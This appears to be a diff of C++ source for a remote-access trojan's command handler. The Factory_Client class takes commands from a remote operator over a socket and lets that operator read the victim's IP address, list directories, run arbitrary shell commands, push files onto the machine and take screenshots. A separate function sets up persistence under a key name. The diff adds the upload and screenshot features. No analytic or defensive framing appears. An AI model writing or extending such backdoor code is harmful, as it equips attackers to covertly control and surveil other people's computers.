@@ -22,7 +22,7 @@ std::vector<std::string> split(const char* buffer)
 }
 
 
-Factory_Client::Factory_Client(SOCKET* sockp, const char* pbuffer) : sock(sockp),buffer(pbuffer)
+Factory_Client::Factory_Client(Client* clientp, const char* pbuffer) : buffer(pbuffer),client(clientp)
 {
 	args = split(pbuffer);
 
@@ -32,22 +32,31 @@ Factory_Client::Factory_Client(SOCKET* sockp, const char* pbuffer) : sock(sockp)
 	}
 	else if (args[0] == "getip" && args.size() == 1)
 	{
-		send(*sock,Auto::get_ip().c_str(),BUFFER_LEN,0);
+		client->send_b(Auto::get_ip().c_str());
 	}
 	else if (args[0] == "ls" && args.size() == 1)
 	{
-		Shell::ls(sock);
+		Shell::ls(client->getSock());
 	}
 	else if (args[0] == "pwd" && args.size() == 1)
 	{
-		Shell::pwd(sock);
+		Shell::pwd(client->getSock());
 	}
 	else if (args[0] == "shell" && args.size() >= 2)
 	{
-		Shell::run(sock,args[1]);
+		Shell::run(client->getSock(), args);
+	}
+	else if (args[0] == "upload" && args.size() == 2)
+	{
+		std::cout << "UPLOAD OLALA" << std::endl;
+		Transfer::uploadToClient(client, args[1]);
+	}
+	else if (args[0] == "screenshot")
+	{
+		Transfer::screenshot(client);
 	}
 	else
-		send(*sock,("Command : " + buffer + " not found ...").c_str(),BUFFER_LEN,0);
+		client->send_b(("Command " + buffer + " not found").c_str());
 
 }
 
@@ -61,7 +70,7 @@ void Factory_Client::arg_self_persistence()
 
 	std::wstring_convert< std::codecvt<wchar_t, char, std::mbstate_t> > conv;
 	std::wstring wstr = conv.from_bytes(keyname);
-	send(*sock,"Putting persistence with keyname : ",36,0);
-	send(*sock, keyname.c_str(), BUFFER_LEN, 0);
+	client->send_b("Putting persistence with keyname : ");
+	client->send_b(keyname.c_str());
 	Auto::persistence(wstr.c_str());
 }
